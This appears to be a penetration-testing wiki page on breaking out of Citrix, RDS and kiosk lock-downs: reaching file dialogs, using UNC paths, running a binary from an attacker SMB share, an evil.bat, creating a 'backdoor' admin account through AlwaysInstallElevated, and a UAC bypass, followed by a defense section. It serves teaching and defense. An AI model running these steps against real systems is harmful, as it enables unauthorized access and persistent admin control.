## TL;DR

Published-application and kiosk platforms (Citrix, RDS/Terminal Services, AWS AppStream, CyberArk PSM) hand users a single app or a locked desktop - no `cmd`, no `powershell`, File Explorer and `regedit` restricted by GPO. The breakout is a three-step methodology: **get a dialog box → turn it into command execution → escalate**. Almost any app feature that opens a file picker (Open/Save/Print/Help/Browse) is the way in.

```
# 1. In any app, open a file dialog (Paint → File → Open), set type = All Files, then:
\\127.0.0.1\c$\users\<you>        # UNC path bypasses File Explorer folder GPO
\\10.10.14.3\share               # reach an attacker SMB share (smbserver.py)

# 2. Right-click a dropped .exe → Open  (pwn.exe = system("cmd.exe"))  → real shell
#    or: modify a shortcut's Target to cmd.exe; or drop evil.bat containing "cmd"

# 3. From the shell, escalate like any host
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

Success indicator: an interactive `cmd.exe`/`powershell.exe` running outside the published app - from there the host is enumerable and escalation proceeds normally.

## When this applies

The target isn't SYSTEM yet - it's a *shell at all*. You're dropped into one Citrix-published app or a kiosk desktop where the lock-down (GPO, no Start-menu shells, blocked `C:\`, disabled `regedit`) is the obstacle. Breaking out to a command prompt is the milestone; standard privilege escalation follows once you have it.

The whole approach rests on one observation: **lock-downs usually restrict the obvious paths (Start menu, File Explorer, regedit) but leave the apps themselves able to touch the filesystem.** Any Open/Save As/Import/Export/Browse/Help/Print/Scan feature can summon a native Windows dialog box, and that dialog ignores much of the shell GPO.

## Step 1 - get a dialog box

Launch any available app with a file feature and open its picker. MS Paint is the canonical example (`File → Open`), but Notepad, WordPad, the print dialog, or an app's "attach/import" button all work. Once the dialog is open you have a minimal file browser that runs with fewer restrictions than Explorer.

## Step 2 - dialog box to command execution

Several routes from the open dialog to a real shell - try them in roughly this order.

### UNC paths past File Explorer GPO

Folder-browsing GPO that blocks `C:\Users` in Explorer typically doesn't block **UNC paths** typed into a dialog's *File name* field. Set the file-type filter to **All Files (\*.\*)** and enter:

```
\\127.0.0.1\c$\users\pmorgan          # loopback admin share → local filesystem
```

The dialog navigates there, giving you a view of the filesystem Explorer refused.

### Launch a binary from an SMB share

The dialog reaches remote UNC paths too, so stage tools on an attacker SMB share rather than fighting file-copy restrictions. Start a server:

```shell
smbserver.py -smb2support share $(pwd)      # impacket, on your Linux host
```

In the dialog, browse to `\\10.10.14.3\share` (All Files). You often can't *copy* out (Explorer restrictions), but you can **right-click an executable → Open** to run it in place. A tiny custom binary that just shells out defeats any "cmd.exe is blocked" name check:

```c
// pwn.c  →  compile to pwn.exe
#include <stdlib.h>
int main() { system("C:\\Windows\\System32\\cmd.exe"); }
```

Right-click `pwn.exe` → Open → a Command Prompt appears. If share access is flaky, `xcopy \\10.10.14.3\share\PowerUp.ps1 .\` pulls files once you have any shell.

### Alternate file and registry editors

When File Explorer itself is the thing locked down, portable third-party editors ignore the Explorer-specific GPO:

- **[Explorer++](https://explorerplusplus.com/)** or **Q-Dir** - portable file managers that browse and copy where Explorer won't (no install needed; run from the share).
- **SimpleRegEdit / UberRegEdit / SmallRegistryEditor** - GUI registry editors that work when `regedit` is blocked by policy.

### Modify an existing shortcut

Shortcuts are editable by the user: right-click any `.lnk` → **Properties** → set **Target** to `C:\Windows\System32\cmd.exe` (or a script) → run it. If no shortcut is present, copy one from the share or generate a malicious `.lnk` with PowerShell.

### Script auto-execution

If `.bat` / `.vbs` / `.ps1` are associated with their interpreters, a dropped script runs on double-click. The minimal breakout is a one-line `evil.bat`:

```bat
cmd
```

Double-clicking it spawns an interactive Command Prompt.

## Step 3 - escalate from the shell

Once you have `cmd`/`powershell`, the lock-down is behind you and normal escalation applies - run winPEAS or PowerUp and work the findings. In these environments **AlwaysInstallElevated** is a common win:

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

If set, PowerUp's `Write-UserAddMSI` generates an MSI that adds a local admin; run it, then switch to the new account:

```powershell
Import-Module .\PowerUp.ps1
Write-UserAddMSI        # creates UserAdd.msi → prompts to add e.g. backdoor:T3st@123 to Administrators
```
```cmd
runas /user:backdoor cmd
```

See [misc techniques](/codex/windows/privesc/misc-techniques/#alwaysinstallelevated) for the AlwaysInstallElevated mechanics and the direct `msfvenom` MSI variant.

### Bypassing UAC

A freshly added admin still holds a *filtered* token, so `C:\Users\Administrator` is denied until you elevate. This is the ordinary filtered-admin-token problem - run a UAC bypass (the `Bypass-UAC` sysprep method is a DLL-hijack of an auto-elevating binary):

```powershell
Import-Module .\Bypass-UAC.ps1
Bypass-UAC -Method UacMethodSysprep
```

The full treatment - enumeration, the registry-hijack and DLL-hijack families, and why UAC isn't a security boundary - is on the [UAC bypass](/codex/windows/privesc/uac-bypass/) page.

## Defense

- Don't rely on File Explorer / Start-menu GPO alone - it doesn't constrain dialog boxes, UNC paths, or portable apps. Enforce **application allowlisting (AppLocker / WDAC)** so only approved binaries run, which blocks `pwn.exe`, Explorer++, alternate regedit tools, and dropped scripts regardless of how they're launched.
- Disable command-line interpreters and script-host associations for kiosk users (`cmd`, `powershell`, `.bat`/`.vbs`/`.ps1` auto-run), and block loopback/remote UNC access (`\\127.0.0.1\c$`, outbound SMB) from the session.
- Remove or lock the published app's file-dialog features where the business case allows; constrain the Save/Open paths.
- Never leave AlwaysInstallElevated set in a published-desktop image, and keep UAC patched and at Always Notify - the breakout is only valuable if escalation follows.
- Monitor published-desktop sessions for `cmd`/`powershell` spawned from Office/Paint/browser parents and for new local accounts.
